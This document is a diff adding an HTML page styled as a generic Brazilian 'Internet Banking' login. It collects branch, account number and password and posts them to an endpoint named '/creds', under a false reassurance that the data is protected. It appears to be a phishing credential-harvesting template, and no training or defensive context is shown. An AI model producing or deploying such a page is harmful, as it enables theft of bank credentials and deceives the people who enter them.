@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet Banking</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #003366; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 0 auto; background: #fff; border-radius: 8px; padding: 30px; }
+        .logo { text-align: center; margin-bottom: 20px; color: #003366; font-size: 24px; font-weight: bold; }
+        h1 { font-size: 18px; color: #333; margin-bottom: 20px; text-align: center; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #ff6600; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        .security { text-align: center; margin-top: 15px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🏦 Internet Banking</div>
+        <h1>Acesse sua conta</h1>
+        <form action="/creds" method="POST">
+            <input type="text" name="agencia" placeholder="Agência" required>
+            <input type="text" name="conta" placeholder="Conta com dígito" required>
+            <input type="password" name="senha" placeholder="Senha de 8 dígitos" required>
+            <button type="submit">Entrar</button>
+        </form>
+        <div class="security">🔒 Seus dados estão protegidos</div>
+    </div>
+</body>
+</html>
